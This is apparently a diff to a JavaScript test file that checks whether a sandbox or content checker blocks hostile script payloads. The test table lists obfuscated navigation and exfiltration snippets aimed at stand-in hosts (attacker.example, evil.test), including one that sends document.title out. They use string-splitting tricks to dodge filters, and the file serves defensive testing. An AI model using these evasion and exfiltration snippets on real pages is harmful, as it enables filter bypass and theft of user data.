@@ -370,7 +370,7 @@ describe('deterministic production-disabled candidate pipeline', () => {
       ['var {defaultView:win}=el.ownerDocument;', 'javascript-authority-closure'],
       ['win["loca"+"tion"].assign("htt"+"ps://attacker.example/");', 'javascript-authority-closure'],
       ['win["loca"+"tion"]["hr"+"ef"]="htt"+"ps://attacker.example/";', 'javascript-authority-closure'],
-      ['var a=document.createElement("a");a.setAttribute("hr"+"ef","htt"+"ps://attacker.example/");a.click();', 'javascript-authority-closure'],
+      ['var a=document.createElement("a");a.setAttribute("hr"+"ef","htt"+"ps://attacker.example/");a.click();', 'network-deny'],
       ['Reflect.get(win,"op"+"en").call(win,"htt"+"ps://attacker.example/");', 'javascript-authority-closure'],
       ['var {location:loc}=w;', 'javascript-authority-closure'],
       ['var f=document.createElement("form");f.submit();', 'javascript-authority-closure'],
@@ -381,6 +381,13 @@ describe('deterministic production-disabled candidate pipeline', () => {
       ['var kk=k();const loc=window.location;loc[kk]="x";', 'network-deny'],
       ['const loc=window.location;leak(loc);', 'network-deny'],
       ['"//attacker.example/x";', 'network-deny'],
+      ['location=String.fromCharCode(104)+"evil.test/?d="+document.title;', 'network-deny'],
+      ['var loc2=location;loc2.assign("x");', 'network-deny'],
+      ['var a=document.createElement("a");a.setAttribute("href","x");a.dispatchEvent(new MouseEvent("click"));', 'network-deny'],
+      ['a.setAttribute("hr"+"ef","x");', 'network-deny'],
+      ['new MouseEvent("click");', 'javascript-authority-closure'],
+      ['el.dispatchEvent(ev);', 'javascript-authority-closure'],
+      ['el.setAttribute("src","x");', 'network-deny'],
     ];
     try {
       for (const [payload, expectedCheck] of payloads) {
